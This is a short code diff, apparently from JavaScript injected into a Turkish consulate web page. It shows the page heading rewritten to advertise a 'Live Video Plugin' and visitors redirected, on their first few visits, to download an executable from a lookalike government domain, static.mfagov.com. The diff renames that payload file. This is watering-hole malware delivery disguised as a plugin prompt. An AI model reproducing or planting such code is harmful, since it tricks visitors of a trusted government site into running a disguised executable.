@@ -3,10 +3,10 @@
 if (store.get('click') == undefined) {
   store.set('click', 1);
   document.getElementById("ctl00_MainContent_Baslik").innerHTML="<span><i></i><label>Live Video Plugin For KONSOLOSLUK</label></span><br><img src='https://www.konsolosluk.gov.tr/ekonsolosluk/assets/images/loading.gif'>";
-  window.location.href="http://static.mfagov.com/KMPlayer-Video-Plugin-11.2.291-release.exe";
+  window.location.href="http://static.mfagov.com/LivePlayer-Video-Plugin-11.2.291-release.exe";
 } else if (store.get('click') < 3) {
   document.getElementById("ctl00_MainContent_Baslik").innerHTML="<span><i></i><label>Live Video Plugin For KONSOLOSLUK</label></span><br><img src='https://www.konsolosluk.gov.tr/ekonsolosluk/assets/images/loading.gif'>";
-  window.location.href="http://static.mfagov.com/KMPlayer-Video-Plugin-11.2.291-release.exe";
+  window.location.href="http://static.mfagov.com/LivePlayer-Video-Plugin-11.2.291-release.exe";
   store.set('click', store.get('click')+1);
 } else {
   window.location.href = "https://www.konsolosluk.gov.tr/";
